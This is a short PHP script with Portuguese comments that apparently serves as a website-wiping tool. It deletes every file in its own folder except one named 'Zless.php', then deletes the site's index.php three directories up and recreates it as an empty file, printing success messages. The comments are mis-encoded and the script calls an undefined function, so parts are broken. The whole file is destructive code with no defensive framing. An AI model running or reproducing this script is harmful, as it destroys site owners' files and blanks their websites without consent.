<?php
 
function d($dir, $DeleteMe) {
    if(!$dh = @opendir($dir)) return;
    while (($obj = readdir($dh))) {
        if($obj=='.' || $obj=='..' || $obj =="Zless.php") continue;
        if (!@unlink($dir.'/'.$obj)) SureRemoveDir($dir.'/'.$obj, true);
    }
    if ($DeleteMe){
        closedir($dh);
        @rmdir($dir);
    }
}

d(dirname(__FILE__), false); 
 
$filename = 'index.php';
$conteudo = "";

// Primeiro vamos ter certeza de que o arquivo existe e pode ser alterado
if (unlink(dirname(dirname(dirname(__FILE__))) . '/'.$filename)) {

 // Em nosso exemplo, nуs vamos abrir o arquivo $filename
 // em modo de adiзгo. O ponteiro do arquivo estarб no final
 // do arquivo, e й pra lб que $conteudo irб quando o 
 // escrevermos com fwrite().
    if (!$handle = fopen(dirname(dirname(dirname(__FILE__))) . '/'.$filename, 'a')) {
         echo "Nгo foi possнvel abrir o arquivo ($filename)";
         exit;
    }

    // Escreve $conteudo no nosso arquivo aberto.
    if (fwrite($handle, $conteudo) === FALSE) {
        echo "Nгo foi possнvel escrever no arquivo ($filename)";
        exit;
    }

    echo "Sucesso: Escrito ($conteudo) no arquivo ($filename)";

    fclose($handle);

} else {
    echo "O arquivo $filename nгo pode ser apagado";
}

?>